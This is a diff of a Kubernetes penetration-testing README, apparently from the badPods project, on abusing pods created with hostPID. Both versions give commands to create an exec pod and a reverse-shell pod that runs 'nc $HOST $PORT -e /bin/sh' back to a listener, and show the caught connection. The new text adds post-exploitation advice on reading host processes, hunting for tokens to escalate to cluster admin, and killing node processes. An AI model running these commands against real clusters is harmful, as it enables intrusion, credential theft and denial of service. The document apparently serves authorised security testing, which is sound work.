@@ -1,85 +1,40 @@
-## You can create a pod with only hostPID
+# Bad Pod #5: hostPID 
 
-You are exploiting the fact that there are no polices preventing the creation of pod with access to the node's filesystem. You are going to create a pod and gain full read/write access to the filesystem of the node the pod is running on. 
+There’s no clear path to get root on the node with only `hostPID`, but there are still some good post exploitation opportunities.  
+*	**View processes on the host** – When you run ps from within a pod that has hostPID: true, you see all the processes running on the host, including processes running within each pod. 
+*	**Look for passwords, tokens, keys, etc.** – If you are lucky, you will find credentials and you’ll be able to use them to escalate privileges within the cluster, to services supported by the cluster, or to services that cluster-hosted applications are communicating with. It is a long shot, but you might find a Kubernetes service account token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster admin. 
+*	**Kill processes** – You can also kill any process on the node (presenting a denial-of-service risk), but I would advise against it on a penetration test!
 
 
 # Pod Creation
-
 ## Create a pod you can exec into
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pod-hostpid
-  labels:
-    app: hostpid
-spec:
-  hostPID: true
-  containers:
-  - image: ubuntu
-    command:
-      - "sleep"
-      - "604800"
-    imagePullPolicy: IfNotPresent
-    name: hostpid
-  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  restartPolicy: Always
-  ```
-[pod-priv.yaml](pod-priv.yaml)
-
-#### Option 1: Create pod from local yaml 
+Create pod
 ```bash
-kubectl apply -f hostpid.yaml   
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml 
+```
+Exec into pod 
+```bash
+kubectl exec -it hostpid-exec-pod -- bash
 ```
 
-#### Option 2: Create pod from github hosted yaml
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpid/hostpid.yaml  
-```
+## Reverse shell pod
 
-### Exec into pod 
-```bash
-kubectl -n [namespace] exec -it pod-hostpid -- bash
-```
-
-## Or, create a reverse shell pod
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pod-priv-revshell
-  labels: 
-    app: pentest
-spec:
-  containers:
-  - name: priv-revshell
-    image: busybox
-    command: [ "/bin/sh", "-c", "--" ]
-    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-    securityContext:
-      privileged: true
-  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
-  restartPolicy: Always
-  ```
-[hostpid-revshell.yaml](hostpid-revshell.yaml)
-
-#### Set up listener
+Set up listener
 ```bash
 nc -nvlp 3116
 ```
 
-#### Create the pod
+Create pod from local manifest without modifying it by using env variables and envsubst
 ```bash
-# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostpid/hostpid-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/hostpid/pod/hostpid-revshell-pod.yaml | kubectl apply -f -
 ```
 
-#### Catch the shell and chroot to /host 
+Catch the shell
 ```bash
-~ nc -nvlp 3116
+$ nc -nvlp 3116
 Listening on 0.0.0.0 3116
 Connection received on 10.0.0.162 42035
 ```
-
 
 # Post exploitation
 
